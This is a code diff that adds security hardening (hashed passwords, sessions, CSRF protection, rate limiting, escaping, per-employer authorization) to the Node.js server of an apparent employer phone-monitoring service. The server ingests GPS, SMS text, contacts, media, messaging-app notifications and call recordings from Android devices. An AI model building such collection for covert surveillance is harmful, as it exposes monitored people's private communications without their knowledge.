@@ -2,13 +2,65 @@ const express = require('express');
 const mongoose = require('mongoose');
 const crypto = require('crypto');
 const path = require('path');
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
+const session = require('express-session');
+const bcrypt = require('bcryptjs');
 const app = express();
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ limit: '50mb', extended: true }));
-app.use(express.static(__dirname + '/public'));
+
+// Render terminates TLS and forwards the original scheme; trust the proxy so
+// the HTTPS redirect below works correctly.
+app.set('trust proxy', 1);
+
+// Security headers (HSTS, X-Content-Type-Options, frameguard, referrer policy, ...).
+// CSP is intentionally off because every page uses inline scripts/styles; move
+// JS/CSS to static files before enabling a strict CSP.
+app.use(helmet({ contentSecurityPolicy: false }));
+
+// Force HTTPS in production.
+app.use((req, res, next) => {
+    if (process.env.NODE_ENV === 'production' && req.headers['x-forwarded-proto'] === 'http') {
+        return res.redirect(301, 'https://' + req.headers.host + req.originalUrl);
+    }
+    next();
+});
+
+// Signed, httpOnly session cookie. Set SESSION_SECRET to a long random string
+// in the environment; without it sessions are regenerated on every restart.
+app.use(session({
+    name: 'flooftracker.sid',
+    secret: process.env.SESSION_SECRET || (() => {
+        console.warn('WARNING: SESSION_SECRET is not set — sessions will not survive restarts.');
+        return crypto.randomBytes(32).toString('hex');
+    })(),
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'strict',
+        maxAge: 7 * 24 * 60 * 60 * 1000
+    }
+}));
+
+// Body parsers: a small limit by default, a large one only where bulk data
+// (media, recordings, SMS sync) is actually uploaded. Parsers are attached
+// per route so oversized bodies are rejected everywhere except where required.
+app.use(express.urlencoded({ limit: '1mb', extended: false }));
+const smallJson = express.json({ limit: '1mb' });
+const bigJson = express.json({ limit: '52mb' });
+
+app.use(express.static(__dirname + '/public', {
+    setHeaders: (res) => res.setHeader('Cache-Control', 'no-cache')
+}));
 
 const PORT = process.env.PORT || 3000;
 const MONGO_URI = process.env.MONGO_URI;
+
+if (!MONGO_URI) {
+    console.error('FATAL: MONGO_URI environment variable is not set.');
+    process.exit(1);
+}
 
 mongoose.connect(MONGO_URI)
     .then(() => console.log('MongoDB connected'))
@@ -16,8 +68,8 @@ mongoose.connect(MONGO_URI)
 
 // Schemas
 const EmployerSchema = new mongoose.Schema({
-    email: { type: String, unique: true },
-    password: String,
+    email: { type: String, unique: true, lowercase: true, trim: true },
+    password: { type: String, select: false },  // bcrypt hash; never returned by default
     plan: { type: String, default: 'free' },
     created_at: { type: Date, default: Date.now }
 });
@@ -146,8 +198,106 @@ const Recording = mongoose.model("Recording", CallRecordingSchema);
 
 const PLAN_LIMITS = { free: 1, starter: 5, business: 10, professional: 20, enterprise: 50 };
 
-function getToken(req) {
-    return req.headers['x-device-token'] || 'unknown';
+// ── Rate limiting ────────────────────────────────────────────────────────────
+const authLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000,   // 15 minutes
+    limit: 20,                  // 20 login/register attempts per window
+    standardHeaders: 'draft-7',
+    legacyHeaders: false,
+    message: { success: false, message: 'Too many attempts. Please try again later.' }
+});
+const deviceLimiter = rateLimit({
+    windowMs: 60 * 1000,
+    limit: 240,                 // 240 requests/min per device is plenty
+    standardHeaders: 'draft-7',
+    legacyHeaders: false,
+    message: { success: false, message: 'Rate limit exceeded' }
+});
+
+// ── Output escaping (stored-XSS defense) ────────────────────────────────────
+function esc(s) {
+    return String(s == null ? '' : s)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+}
+
+function maskToken(t) {
+    return t ? String(t).slice(0, 6) + '…' + String(t).slice(-4) : '';
+}
+
+// ── CSRF (double-submit pattern) ─────────────────────────────────────────────
+// A random token lives in the session, is echoed into every rendered page, and
+// is sent back as the X-CSRF-Token header by the dashboard scripts. Cross-site
+// requests cannot read or guess it.
+app.use((req, res, next) => {
+    if (!req.session.csrfToken) req.session.csrfToken = crypto.randomBytes(24).toString('hex');
+    res.locals.csrfToken = req.session.csrfToken;
+    next();
+});
+
+function requireCsrf(req, res, next) {
+    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
+    const provided = req.headers['x-csrf-token'] || (req.body && req.body._csrf);
+    if (!provided || provided !== req.session.csrfToken) {
+        return res.status(403).json({ success: false, message: 'Invalid or missing CSRF token' });
+    }
+    next();
+}
+
+// ── Authentication / authorization ───────────────────────────────────────────
+function requireAuth(req, res, next) {
+    if (!req.session || !req.session.employer_id) {
+        return res.status(401).json({ success: false, message: 'Not authenticated' });
+    }
+    next();
+}
+
+function requireAuthPage(req, res, next) {
+    if (!req.session || !req.session.employer_id) return res.redirect('/');
+    next();
+}
+
+// Only the employer that OWNS a device token may access that device's data.
+async function requireOwnedToken(req, res, next) {
+    try {
+        const token = String(req.query.token || (req.body && req.body.token) || '').trim();
+        const doc = await Token.findOne({ token, active: true, employer_id: req.session.employer_id });
+        if (!doc) return res.status(403).json({ success: false, message: 'Device not found' });
+        req.deviceToken = token;
+        req.tokenDoc = doc;
+        next();
+    } catch (e) {
+        next(e);
+    }
+}
+
+// Devices authenticate with the x-device-token header (a hex secret).
+async function requireValidDeviceToken(req, res, next) {
+    try {
+        const token = String(req.headers['x-device-token'] || '').trim();
+        if (!/^[a-f0-9]{32,64}$/i.test(token)) {
+            return res.status(401).json({ success: false, message: 'Invalid device token' });
+        }
+        const doc = await Token.findOne({ token, active: true });
+        if (!doc) return res.status(401).json({ success: false, message: 'Invalid device token' });
+        req.deviceToken = token;
+        req.tokenDoc = doc;
+        next();
+    } catch (e) {
+        next(e);
+    }
+}
+
+// ── Validation helpers ───────────────────────────────────────────────────────
+function isStr(v, max) { return typeof v === 'string' && v.length <= max; }
+function isNonEmptyStr(v, max) { return typeof v === 'string' && v.length > 0 && v.length <= max; }
+function isNum(v) { return typeof v === 'number' && Number.isFinite(v); }
+function cleanFilename(name) {
+    if (!isNonEmptyStr(name, 255)) return null;
+    return String(name).replace(/[\\/]/g, '');  // strip path separators
 }
 
 const styles = `
@@ -298,221 +448,356 @@ const styles = `
 
 // ── Employer Routes ──────────────────────────────────────────────────────────
 
-app.post('/employer/register', async (req, res) => {
+app.post('/employer/register', smallJson, authLimiter, async (req, res) => {
     try {
-        const { email, password } = req.body;
+        const email = String((req.body && req.body.email) || '').trim().toLowerCase();
+        const password = String((req.body && req.body.password) || '');
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+            return res.json({ success: false, message: 'Please enter a valid email address' });
+        }
+        if (password.length < 8) {
+            return res.json({ success: false, message: 'Password must be at least 8 characters' });
+        }
         const existing = await Employer.findOne({ email });
-        if (existing) return res.json({ success: false, message: 'Email already exists' });
-        const employer = await Employer.create({ email, password });
-        res.json({ success: true, employer_id: employer._id });
+        if (existing) return res.json({ success: false, message: 'That email is already registered' });
+        const hash = await bcrypt.hash(password, 10);
+        const employer = await Employer.create({ email, password: hash });
+        // Auto-login after registration: fresh session + fresh CSRF token.
+        req.session.regenerate((err) => {
+            if (err) return res.json({ success: false, message: 'Could not start session' });
+            req.session.employer_id = employer._id.toString();
+            req.session.plan = employer.plan;
+            req.session.csrfToken = crypto.randomBytes(24).toString('hex');
+            res.json({ success: true, employer_id: employer._id, plan: employer.plan });
+        });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('Register error:', e);
+        res.json({ success: false, message: 'Registration failed' });
     }
 });
 
-app.post('/employer/login', async (req, res) => {
+app.post('/employer/login', smallJson, authLimiter, async (req, res) => {
     try {
-        const { email, password } = req.body;
-        const employer = await Employer.findOne({ email, password });
-        if (!employer) return res.json({ success: false, message: 'Invalid credentials' });
-        res.json({ success: true, employer_id: employer._id, plan: employer.plan });
+        const email = String((req.body && req.body.email) || '').trim().toLowerCase();
+        const password = String((req.body && req.body.password) || '');
+        const employer = await Employer.findOne({ email }).select('+password');
+        const ok = employer && await bcrypt.compare(password, employer.password);
+        if (!ok) return res.json({ success: false, message: 'Invalid credentials' });
+        // Session fixation protection: fresh session id + fresh CSRF token on login.
+        req.session.regenerate((err) => {
+            if (err) return res.json({ success: false, message: 'Could not start session' });
+            req.session.employer_id = employer._id.toString();
+            req.session.plan = employer.plan;
+            req.session.csrfToken = crypto.randomBytes(24).toString('hex');
+            res.json({ success: true, employer_id: employer._id, plan: employer.plan });
+        });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('Login error:', e);
+        res.json({ success: false, message: 'Login failed' });
     }
 });
 
-app.post('/employer/set-plan', async (req, res) => {
+app.post('/employer/set-plan', smallJson, requireAuth, requireCsrf, async (req, res) => {
     try {
-        const { employer_id, plan } = req.body;
-        await Employer.findByIdAndUpdate(employer_id, { plan });
+        const plan = String((req.body && req.body.plan) || '');
+        if (!(plan in PLAN_LIMITS)) return res.json({ success: false, message: 'Unknown plan' });
+        await Employer.findByIdAndUpdate(req.session.employer_id, { plan });
+        req.session.plan = plan;
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('set-plan error:', e);
+        res.json({ success: false, message: 'Failed to update plan' });
     }
 });
 
-app.post('/employer/generate-token', async (req, res) => {
+app.post('/employer/generate-token', smallJson, requireAuth, requireCsrf, async (req, res) => {
     try {
-        const { employer_id } = req.body;
-        const employer = await Employer.findById(employer_id);
+        const employer = await Employer.findById(req.session.employer_id);
         if (!employer) return res.json({ success: false, message: 'Employer not found' });
-        const tokenCount = await Token.countDocuments({ employer_id, active: true });
+        const tokenCount = await Token.countDocuments({ employer_id: employer._id, active: true });
         const limit = PLAN_LIMITS[employer.plan] || 1;
         if (tokenCount >= limit) {
             return res.json({ success: false, message: `Device limit reached for ${employer.plan} plan. Please upgrade.` });
         }
-        const token = crypto.randomBytes(16).toString('hex');
-        await Token.create({ token, employer_id });
+        const token = crypto.randomBytes(32).toString('hex');  // 64-char hex secret
+        await Token.create({ token, employer_id: employer._id });
         res.json({ success: true, token });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('generate-token error:', e);
+        res.json({ success: false, message: 'Failed to generate token' });
     }
 });
 
-app.post('/employer/tokens', async (req, res) => {
+app.post('/employer/tokens', smallJson, requireAuth, requireCsrf, async (req, res) => {
     try {
-        const { employer_id } = req.body;
-        const tokens = await Token.find({ employer_id, active: true });
+        const tokens = await Token.find({ employer_id: req.session.employer_id, active: true })
+            .sort({ created_at: -1 });
         res.json({ success: true, tokens });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('tokens error:', e);
+        res.json({ success: false, message: 'Failed to load devices' });
     }
 });
 
-app.post('/employer/delete-token', async (req, res) => {
+app.post('/employer/delete-token', smallJson, requireAuth, requireCsrf, async (req, res) => {
     try {
-        const { token_id } = req.body;
-        await Token.findByIdAndUpdate(token_id, { active: false });
+        const tokenDoc = await Token.findOne({
+            _id: (req.body && req.body.token_id),
+            employer_id: req.session.employer_id
+        });
+        if (!tokenDoc) return res.json({ success: false, message: 'Device not found' });
+        const token = tokenDoc.token;
+        await Token.findByIdAndUpdate(tokenDoc._id, { active: false });
+        // Removing a device revokes its token AND deletes all of its data.
+        await Promise.all([
+            Device.deleteMany({ token }),
+            Gps.deleteMany({ token }),
+            Call.deleteMany({ token }),
+            Sms.deleteMany({ token }),
+            App.deleteMany({ token }),
+            Contact.deleteMany({ token }),
+            Media.deleteMany({ token }),
+            Notification.deleteMany({ token }),
+            DownloadRequest.deleteMany({ token }),
+            CallRecording.deleteMany({ token }),
+            Command.deleteMany({ token })
+        ]);
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('delete-token error:', e);
+        res.json({ success: false, message: 'Failed to remove device' });
     }
 });
 
 // ── Device Routes ────────────────────────────────────────────────────────────
 
-app.post('/device/validate-token', async (req, res) => {
-    try {
-        const token = getToken(req);
-        const valid = await Token.findOne({ token, active: true });
-        if (!valid) return res.json({ success: false, message: 'Invalid token' });
-        res.json({ success: true });
-    } catch (e) {
-        res.json({ success: false, message: e.message });
-    }
+app.post('/device/validate-token', smallJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
+    res.json({ success: true });
 });
 
-app.post('/device/register', async (req, res) => {
+app.post('/device/register', smallJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const token = getToken(req);
+        const token = req.deviceToken;
+        const model = String((req.body && req.body.device_model) || '').slice(0, 200);
+        const androidVersion = String((req.body && req.body.android_version) || '').slice(0, 50);
         await Device.findOneAndUpdate(
             { token },
-            { token, ...req.body, last_seen: new Date() },
+            { token, device_model: model, android_version: androidVersion, last_seen: new Date() },
             { upsert: true }
         );
         await Token.findOneAndUpdate(
             { token },
-            { registered: true, device_name: req.body.device_model }
+            { registered: true, device_name: model }
         );
-        console.log(`Device registered: ${token}`);
+        console.log(`Device registered: ${maskToken(token)}`);
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('register error:', e);
+        res.json({ success: false, message: 'Registration failed' });
     }
 });
 
-app.post('/device/gps', async (req, res) => {
+app.post('/device/gps', smallJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const token = getToken(req);
-        await Gps.create({ token, ...req.body, received_at: new Date() });
+        const b = req.body || {};
+        if (b.latitude == null || b.longitude == null || b.accuracy == null) {
+            return res.json({ success: false, message: 'Invalid location data' });
+        }
+        const lat = Number(b.latitude);
+        const lon = Number(b.longitude);
+        const acc = Number(b.accuracy);
+        if (!Number.isFinite(lat) || lat < -90 || lat > 90 ||
+            !Number.isFinite(lon) || lon < -180 || lon > 180 ||
+            !Number.isFinite(acc) || acc < 0 || acc > 100000) {
+            return res.json({ success: false, message: 'Invalid location data' });
+        }
+        await Gps.create({ token: req.deviceToken, latitude: lat, longitude: lon, accuracy: acc, received_at: new Date() });
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('gps error:', e);
+        res.json({ success: false, message: 'Failed to save location' });
     }
 });
 
-app.post('/device/calls', async (req, res) => {
+app.post('/device/calls', smallJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const token = getToken(req);
-        await Call.deleteMany({ token });
-        await Call.insertMany(req.body.map(c => ({ token, ...c })));
-        console.log(`${req.body.length} calls from ${token}`);
-        res.json({ success: true });
-    } catch (e) {
-        res.json({ success: false, message: e.message });
-    }
-});
-
-app.post('/device/sms', async (req, res) => {
-    try {
-        const token = getToken(req);
-        const messages = req.body;
-        
-        for (const msg of messages) {
-            const existing = await Sms.findOne({
-                token,
-                number: msg.number,
-                received_at: msg.received_at
+        const calls = Array.isArray(req.body) ? req.body : [];
+        if (calls.length > 1000) return res.json({ success: false, message: 'Too many call records' });
+        const cleaned = [];
+        for (const c of calls) {
+            if (!c || !isNonEmptyStr(c.number, 64) || !isStr(c.contact_name, 255) ||
+                !isNonEmptyStr(c.call_type, 16) || !isNum(c.duration_seconds) || !isNum(c.called_at)) continue;
+            cleaned.push({
+                token: req.deviceToken,
+                number: c.number,
+                contact_name: c.contact_name || '',
+                call_type: c.call_type,
+                duration_seconds: Math.max(0, Math.floor(c.duration_seconds)),
+                called_at: Math.floor(c.called_at)
             });
+        }
+        await Call.deleteMany({ token: req.deviceToken });
+        if (cleaned.length) await Call.insertMany(cleaned);
+        console.log(`${cleaned.length} calls from ${maskToken(req.deviceToken)}`);
+        res.json({ success: true });
+    } catch (e) {
+        console.error('calls error:', e);
+        res.json({ success: false, message: 'Failed to save calls' });
+    }
+});
+
+app.post('/device/sms', bigJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
+    try {
+        const messages = Array.isArray(req.body) ? req.body : [];
+        if (messages.length > 5000) return res.json({ success: false, message: 'Too many SMS records' });
+        const token = req.deviceToken;
+        for (const msg of messages) {
+            if (!msg || !isNonEmptyStr(msg.number, 64) || !isStr(msg.contact_name, 255) ||
+                !isStr(msg.message_body, 5000) || !isNonEmptyStr(msg.sms_type, 8) || !isNum(msg.received_at)) continue;
+            const existing = await Sms.findOne({ token, number: msg.number, received_at: msg.received_at });
             if (!existing) {
-                await Sms.create({ token, ...msg });
+                await Sms.create({
+                    token,
+                    number: msg.number,
+                    contact_name: msg.contact_name || '',
+                    message_body: msg.message_body || '',
+                    sms_type: msg.sms_type,
+                    received_at: Math.floor(msg.received_at)
+                });
             }
         }
-        
-        console.log(`${messages.length} SMS from ${token}`);
+        console.log(`${messages.length} SMS from ${maskToken(token)}`);
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('sms error:', e);
+        res.json({ success: false, message: 'Failed to save SMS' });
     }
 });
 
-app.post('/device/apps', async (req, res) => {
+app.post('/device/apps', bigJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const token = getToken(req);
-        await App.deleteMany({ token });
-        await App.insertMany(req.body.map(a => ({ token, ...a })));
-        console.log(`${req.body.length} apps from ${token}`);
-        res.json({ success: true });
-    } catch (e) {
-        res.json({ success: false, message: e.message });
-    }
-});
-
-app.post('/device/contacts', async (req, res) => {
-    try {
-        const token = getToken(req);
-        await Contact.deleteMany({ token });
-        await Contact.insertMany(req.body.map(c => ({ token, ...c })));
-        console.log(`${req.body.length} contacts from ${token}`);
-        res.json({ success: true });
-    } catch (e) {
-        res.json({ success: false, message: e.message });
-    }
-});
-
-app.post('/device/media', async (req, res) => {
-    try {
-        const token = getToken(req);
-        console.log(`Media received from token: ${token}, count: ${req.body.length}`);
-        const deleted = await Media.deleteMany({ token });
-        console.log(`Deleted ${deleted.deletedCount} old media records`);
-        await Media.insertMany(req.body.map(m => ({ token, ...m })));
-        res.json({ success: true });
-    } catch (e) {
-        console.error('Media error:', e.message);
-        res.json({ success: false, message: e.message });
-    }
-});
-
-app.post('/device/notifications', async (req, res) => {
-    try {
-        const token = getToken(req);
-        const { app, sender, chat_id, message, received_at } = req.body;
-        
-        // Check if exact message already exists for this sender
-        const existing = await Notification.findOne({ 
-            token, app, sender, message
-        });
-        
-        if (!existing) {
-            await Notification.create({ token, ...req.body, received_at: new Date() });
-            console.log(`Notification from ${token}: ${app} - ${sender}`);
+        const apps = Array.isArray(req.body) ? req.body : [];
+        if (apps.length > 2000) return res.json({ success: false, message: 'Too many app records' });
+        const cleaned = [];
+        for (const a of apps) {
+            if (!a || !isNonEmptyStr(a.app_name, 200) || !isNonEmptyStr(a.package_name, 200) ||
+                !isNum(a.usage_seconds) || !isStr(a.usage_date, 20)) continue;
+            cleaned.push({
+                token: req.deviceToken,
+                app_name: a.app_name,
+                package_name: a.package_name,
+                usage_seconds: Math.max(0, Math.floor(a.usage_seconds)),
+                usage_date: a.usage_date || ''
+            });
         }
-        
+        await App.deleteMany({ token: req.deviceToken });
+        if (cleaned.length) await App.insertMany(cleaned);
+        console.log(`${cleaned.length} apps from ${maskToken(req.deviceToken)}`);
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('apps error:', e);
+        res.json({ success: false, message: 'Failed to save apps' });
     }
 });
 
-app.post('/device/call-recording', async (req, res) => {
+app.post('/device/contacts', bigJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const token = getToken(req);
-        await CallRecording.create({ token, ...req.body });
-        console.log(`Call recording received from ${token}: ${req.body.filename}`);
+        const contacts = Array.isArray(req.body) ? req.body : [];
+        if (contacts.length > 10000) return res.json({ success: false, message: 'Too many contact records' });
+        const cleaned = [];
+        for (const c of contacts) {
+            if (!c || !isStr(c.name, 255) || !isNonEmptyStr(c.number, 64)) continue;
+            cleaned.push({ token: req.deviceToken, name: c.name || '', number: c.number });
+        }
+        await Contact.deleteMany({ token: req.deviceToken });
+        if (cleaned.length) await Contact.insertMany(cleaned);
+        console.log(`${cleaned.length} contacts from ${maskToken(req.deviceToken)}`);
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('contacts error:', e);
+        res.json({ success: false, message: 'Failed to save contacts' });
+    }
+});
+
+app.post('/device/media', bigJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
+    try {
+        const media = Array.isArray(req.body) ? req.body : [];
+        if (media.length > 500) return res.json({ success: false, message: 'Too many media records' });
+        const token = req.deviceToken;
+        const cleaned = [];
+        for (const m of media) {
+            if (!m || (m.media_type !== 'image' && m.media_type !== 'video') ||
+                !isNonEmptyStr(m.filename, 255) || !isStr(m.path, 500) ||
+                !isStr(m.thumbnail, 5 * 1024 * 1024)) continue;
+            cleaned.push({
+                token,
+                media_type: m.media_type,
+                filename: m.filename,
+                date_taken: isNum(m.date_taken) ? m.date_taken : 0,
+                path: m.path || '',
+                size_bytes: isNum(m.size_bytes) ? Math.max(0, m.size_bytes) : 0,
+                duration_ms: isNum(m.duration_ms) ? m.duration_ms : 0,
+                is_screenshot: !!m.is_screenshot,
+                thumbnail: m.thumbnail || ''
+            });
+        }
+        await Media.deleteMany({ token });
+        if (cleaned.length) await Media.insertMany(cleaned);
+        console.log(`Media received from token: ${maskToken(token)}, count: ${cleaned.length}`);
+        res.json({ success: true });
+    } catch (e) {
+        console.error('Media error:', e);
+        res.json({ success: false, message: 'Failed to save media' });
+    }
+});
+
+app.post('/device/notifications', smallJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
+    try {
+        const b = req.body || {};
+        const token = req.deviceToken;
+        if (!isNonEmptyStr(b.app, 50) || !isStr(b.sender, 255) || !isStr(b.message, 5000) ||
+            (b.direction !== undefined && b.direction !== 'incoming' && b.direction !== 'outgoing')) {
+            return res.json({ success: false, message: 'Invalid notification data' });
+        }
+        const existing = await Notification.findOne({ token, app: b.app, sender: b.sender, message: b.message });
+        if (!existing) {
+            await Notification.create({
+                token,
+                app: b.app,
+                sender: b.sender || '',
+                chat_id: isStr(b.chat_id, 255) ? b.chat_id : '',
+                recipient: isStr(b.recipient, 255) ? b.recipient : '',
+                message: b.message || '',
+                direction: b.direction === 'outgoing' ? 'outgoing' : 'incoming',
+                received_at: new Date()
+            });
+            console.log(`Notification from ${maskToken(token)}: ${b.app} - ${b.sender}`);
+        }
+        res.json({ success: true });
+    } catch (e) {
+        console.error('notifications error:', e);
+        res.json({ success: false, message: 'Failed to save notification' });
+    }
+});
+
+app.post('/device/call-recording', bigJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
+    try {
+        const b = req.body || {};
+        if (!isNonEmptyStr(b.filename, 255) || !isNonEmptyStr(b.audio_base64, 52 * 1024 * 1024)) {
+            return res.json({ success: false, message: 'Invalid recording data' });
+        }
+        await CallRecording.create({
+            token: req.deviceToken,
+            filename: b.filename,
+            audio_base64: b.audio_base64,
+            recorded_at: isNum(b.recorded_at) ? b.recorded_at : 0,
+            received_at: new Date()
+        });
+        console.log(`Call recording received from ${maskToken(req.deviceToken)}: ${b.filename}`);
+        res.json({ success: true });
+    } catch (e) {
+        console.error('call-recording error:', e);
+        res.json({ success: false, message: 'Failed to save recording' });
     }
 });
 
@@ -610,7 +895,7 @@ app.get('/register', (req, res) => {
     </body></html>`);
 });
 
-app.get('/welcome', (req, res) => {
+app.get('/welcome', requireAuthPage, (req, res) => {
     res.send(`<!DOCTYPE html><html><head><title>Welcome - FloofTracker</title><style>
     ${styles}
     .feature-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(180px,1fr)); gap:16px; margin:20px 0; }
@@ -639,12 +924,12 @@ app.get('/welcome', (req, res) => {
     </div>
     <script>
         if (!localStorage.getItem('employer_id')) window.location.href = '/';
-        function logout() { localStorage.clear(); window.location.href = '/'; }
+        function logout() { window.location.href = '/logout'; }
     </script>
     </body></html>`);
 });
 
-app.get('/plans', (req, res) => {
+app.get('/plans', requireAuthPage, (req, res) => {
     res.send(`<!DOCTYPE html><html><head><title>Plans - FloofTracker</title><style>
     ${styles}
     .btn { padding:12px 24px; font-size:14px; width:100%; margin-top:12px; }
@@ -690,12 +975,12 @@ app.get('/plans', (req, res) => {
     </div>
     <script>
         if (!localStorage.getItem('employer_id')) window.location.href = '/';
-        function logout() { localStorage.clear(); window.location.href = '/'; }
+        window.CSRF_TOKEN = '${res.locals.csrfToken}';
+        function logout() { window.location.href = '/logout'; }
         async function selectPlan(plan) {
-            const employer_id = localStorage.getItem('employer_id');
             await fetch('/employer/set-plan', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ employer_id, plan })
+                method:'POST', headers:{'Content-Type':'application/json','X-CSRF-Token':window.CSRF_TOKEN},
+                body: JSON.stringify({ plan })
             });
             localStorage.setItem('plan', plan);
             window.location.href = '/tokens';
@@ -704,7 +989,7 @@ app.get('/plans', (req, res) => {
     </body></html>`);
 });
 
-app.get('/tokens', (req, res) => {
+app.get('/tokens', requireAuthPage, (req, res) => {
     res.send(`<!DOCTYPE html><html><head><title>Devices - FloofTracker</title><style>
     ${styles}
     .top-bar { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
@@ -730,15 +1015,20 @@ app.get('/tokens', (req, res) => {
     </div>
     <script>
         if (!localStorage.getItem('employer_id')) window.location.href = '/';
-        const employer_id = localStorage.getItem('employer_id');
+        window.CSRF_TOKEN = '${res.locals.csrfToken}';
         const plan = localStorage.getItem('plan') || 'free';
         const limits = { free:1, starter:5, business:10, professional:20, enterprise:'Unlimited' };
+        function esc(s) {
+            return String(s == null ? '' : s)
+                .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+        }
         document.getElementById('plan_label').textContent = plan.charAt(0).toUpperCase() + plan.slice(1);
 
         async function loadTokens() {
             const res = await fetch('/employer/tokens', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ employer_id })
+                method:'POST', headers:{'Content-Type':'application/json','X-CSRF-Token':window.CSRF_TOKEN},
+                body: '{}'
             });
             const data = await res.json();
             const list = document.getElementById('tokens_list');
@@ -754,17 +1044,17 @@ app.get('/tokens', (req, res) => {
                 <div class="token-card">
                     <div style="flex:1;min-width:0;margin-right:12px">
                         <div style="font-weight:bold;margin-bottom:4px">
-                            \${t.registered ? '📱 ' + t.device_name : '⏳ Awaiting registration'}
+                            \${t.registered ? '📱 ' + esc(t.device_name) : '⏳ Awaiting registration'}
                         </div>
-                        <div class="token-code">\${t.token}</div>
+                        <div class="token-code">\${esc(t.token)}</div>
                         <span class="badge \${t.registered ? 'badge-green' : 'badge-gray'}" style="margin-top:6px;display:inline-block">
                             \${t.registered ? 'Active' : 'Not registered'}
                         </span>
                     </div>
                     <div style="display:flex;gap:8px;flex-shrink:0">
-                        <button class="btn btn-sm btn-outline" onclick="copyToken('\${t.token}')">Copy</button>
-                        \${t.registered ? \`<button class="btn btn-sm btn-primary" onclick="viewDevice('\${t.token}')">View</button>\` : ''}
-                        <button class="btn btn-sm btn-danger" onclick="deleteToken('\${t._id}')">Remove</button>
+                        <button class="btn btn-sm btn-outline" onclick="copyToken('\${esc(t.token)}')">Copy</button>
+                        \${t.registered ? \`<button class="btn btn-sm btn-primary" onclick="viewDevice('\${esc(t.token)}')">View</button>\` : ''}
+                        <button class="btn btn-sm btn-danger" onclick="deleteToken('\${esc(t._id)}')">Remove</button>
                     </div>
                 </div>
             \`).join('');
@@ -772,8 +1062,8 @@ app.get('/tokens', (req, res) => {
 
         async function generateToken() {
             const res = await fetch('/employer/generate-token', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ employer_id })
+                method:'POST', headers:{'Content-Type':'application/json','X-CSRF-Token':window.CSRF_TOKEN},
+                body: '{}'
             });
             const data = await res.json();
             const msg = document.getElementById('msg');
@@ -784,7 +1074,7 @@ app.get('/tokens', (req, res) => {
         async function deleteToken(token_id) {
             if (!confirm('Remove this device?')) return;
             await fetch('/employer/delete-token', {
-                method:'POST', headers:{'Content-Type':'application/json'},
+                method:'POST', headers:{'Content-Type':'application/json','X-CSRF-Token':window.CSRF_TOKEN},
                 body: JSON.stringify({ token_id })
             });
             loadTokens();
@@ -796,7 +1086,7 @@ app.get('/tokens', (req, res) => {
         }
 
         function viewDevice(token) { window.location.href = '/device?token=' + token; }
-        function logout() { localStorage.clear(); window.location.href = '/'; }
+        function logout() { window.location.href = '/logout'; }
 
         loadTokens();
     </script>
@@ -804,10 +1094,13 @@ app.get('/tokens', (req, res) => {
 });
 
 // Per-device dashboard with tabs
-app.get('/device', async (req, res) => {
-    const token = req.query.token;
+app.get('/device', requireAuthPage, async (req, res) => {
+    const token = String(req.query.token || '');
 
     if (!token) return res.redirect('/tokens');
+    // Authorization: only the employer that OWNS this token may view the device.
+    const owner = await Token.findOne({ token, active: true, employer_id: req.session.employer_id });
+    if (!owner) return res.redirect('/tokens');
     const device = await Device.findOne({ token });
     const gps = await Gps.find({ token }).sort({ received_at: -1 }).limit(50);
     const calls = await Call.find({ token }).sort({ called_at: -1 });
@@ -828,15 +1121,15 @@ app.get('/device', async (req, res) => {
     </head><body>
     <div class="header">
         <div style="min-width:0">
-            <h1>📱 ${device?.device_model || 'Device'}</h1>
-            <small>Android ${device?.android_version || '—'}
+            <h1>📱 ${esc(device?.device_model) || 'Device'}</h1>
+            <small>Android ${esc(device?.android_version) || '—'}
                 · <span class="status-dot ${isOnline ? 'status-online' : 'status-offline'}"></span><span class="${isOnline ? 'status-text-online' : 'status-text-offline'}">${isOnline ? 'Online' : 'Offline'}</span>
-                · Last seen: ${device?.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never'}
+                · Last seen: ${device?.last_seen ? esc(new Date(device.last_seen).toLocaleString()) : 'Never'}
             </small>
         </div>
         <div style="display:flex;gap:8px">
